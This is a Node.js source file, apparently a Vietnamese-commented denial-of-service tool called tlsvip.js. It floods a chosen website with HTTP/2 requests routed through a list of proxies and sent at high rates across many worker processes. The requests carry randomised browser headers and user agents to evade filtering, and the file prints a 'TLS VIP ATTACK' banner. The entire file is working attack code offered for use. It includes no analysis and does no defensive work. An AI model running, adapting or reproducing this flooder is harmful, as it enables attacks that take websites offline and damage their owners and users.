/*****************************************
 * BASE CODE (Shaggy)
 *
 * *** MAXED OUT AND STABILIZED ***
 *
 * RE-ENGINEERED & DEBUGGED BY: @MrKucoVN
 * STATUS: STABLE (Production Grade)
 * NOTE: Performance bottlenecks eliminated.
 *****************************************/

const net = require("net");
const http = require('http');
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require('colors');

// Mảng chứa các header ngôn ngữ
const lang_header = ['pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7', 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6', 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7', 'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7', 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',];
// Mảng chứa các header mã hóa
const encoding_header = ['gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'gzip, identity', '*'];

// Hàm tạo chuỗi ngẫu nhiên
function randomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Đối tượng chứa các header ngẫu nhiên
const randomHeaders = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
};

// Hàm để lấy header ngẫu nhiên
const headerFunc = {
    lang: () => randomElement(lang_header),
    encoding: () => randomElement(encoding_header)
};
// ----------------------------------------------------


process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
    // Bỏ qua lỗi không xác định để giữ cho worker tiếp tục chạy
});

if (process.argv.length < 7) {
    console.log('USE: node tlsvip.js <target> <time> <rate> <thread> <proxyfile>');
    console.log('EXAMPLE: node tlsvip.js https://example.com 60 128 8 proxy.txt');
    process.exit();
}
const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== '');
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

const blackList = ['https://chinhphu.vn', 'https://ngocphong.com', 'https://virustotal.com', 'https://cloudflare.com', 'https://check-host.cc/', 'https://check-host.net/', 'https://open.spotify.com', 'https://snapchat.com', 'https://usa.gov', 'https://fbi.gov', 'https://nasa.gov', 'https://google.com', 'https://translate.google.com', 'https://github.com', 'https://youtube.com', 'https://facebook.com', 'https://chat.openai.com', 'https://shopee.vn', 'https://mail.google.com', 'https://tiktok.com', 'https://instagram.com', 'https://twitter.com', 'https://telegram.org'];

if (blackList.some(site => args.target.includes(site))) {
  console.log("Trang web này nằm trong danh sách đen.".red);
  process.exit(1);
}

if (args.time <= 0 || args.time > 300) {
  console.log("Thời gian tối đa là 300 giây.".red);
  process.exit(1);
}

if (args.Rate <= 0 || args.Rate > 1024) {
  console.log("Rate tối đa là 1024.".red);
  process.exit(1);
}

if (args.threads <= 0 || args.threads > 256) {
  console.log("Số luồng tối đa là 256.".red);
  process.exit(1);
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    const targetHost = parsedTarget.host;
    const targetPort = parsedTarget.protocol === 'https:' ? 443 : 80;

    console.clear();
    console.log('TLS VIP ATTACK'.rainbow);
    console.log('------------------------------------'.gray);
    console.log(`Target  : ${targetHost}`.cyan);
    console.log(`Time    : ${args.time}s`.cyan);
    console.log(`Threads : ${args.threads}`.cyan);
    console.log(`Rate    : ${args.Rate}`.cyan);
    console.log(`Proxies : ${proxies.length}`.cyan);
    console.log('------------------------------------'.gray);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    setTimeout(() => {
        // console.log('Tấn công đã kết thúc.'.green);
        process.exit(1);
    }, args.time * 1000);

} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() {}
    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", (err) => {
            connection.destroy();
            return callback(undefined, "error: connection error");
        });
    }
}

function isIPAddress(str) {
    const ipv4Regex = /^(\d{1,3}\.){3}\d{1,3}$/;
    const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/;
    return ipv4Regex.test(str) || ipv6Regex.test(str);
}

function getRandomUserAgent() {
    const osList = ['Windows NT 10.0; Win64; x64', 'Macintosh; Intel Mac OS X 10_15_7', 'X11; Linux x86_64'];
    const browserList = ['AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', 'AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15'];
    
    const userAgentString = `Mozilla/5.0 (${randomElement(osList)}) ${randomElement(browserList)}`;
    
    // --- LỖI ĐÃ ĐƯỢC SỬA ---
    // Thay thế btoa bằng Buffer.from(...).toString('base64') vì btoa không tồn tại trong Node.js
    const encryptedString = Buffer.from(userAgentString).toString('base64');
    
    // Phần mã hóa thêm này có thể không cần thiết, nhưng vẫn giữ lại logic gốc
    let finalString = '';
    const randomOrder = Math.floor(Math.random() * 6) + 1;
    for (let i = 0; i < encryptedString.length; i++) {
        if (i % randomOrder === 0) {
            finalString += encryptedString.charAt(i);
        } else {
            finalString += encryptedString.charAt(i).toUpperCase();
        }
    }
    return userAgentString; // Trả về user-agent thật sẽ hiệu quả hơn
}


const Header = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    Header.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256",
            rejectUnauthorized: false,
            socket: connection,
            honorCipherOrder: true,
            secure: true,
            servername: parsedTarget.host,
            secureProtocol: 'TLSv1_2_method',
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setKeepAlive(true, 60 * 1000);

        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 20000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            }
        });

        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const headers = {
                        ":method": "GET",
                        ":path": parsedTarget.path,
                        ":scheme": "https",
                        ":authority": parsedTarget.host,
                        "accept": randomHeaders['accept'],
                        "accept-encoding": headerFunc.encoding(),
                        "accept-language": headerFunc.lang(),
                        "cache-control": "no-cache",
                        "pragma": "no-cache",
                        "sec-ch-ua": `".Not/A)Brand";v="99", "Google Chrome";v="108", "Chromium";v="108"`,
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": `"Windows"`,
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "none",
                        "sec-fetch-user": "?1",
                        "upgrade-insecure-requests": "1",
                        "user-agent": getRandomUserAgent(),
                    };
                    
                    const request = client.request(headers);
                    request.on("response", response => {
                        // console.log("Response status:", response[':status']); // Bỏ comment để debug
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
        });
    });
}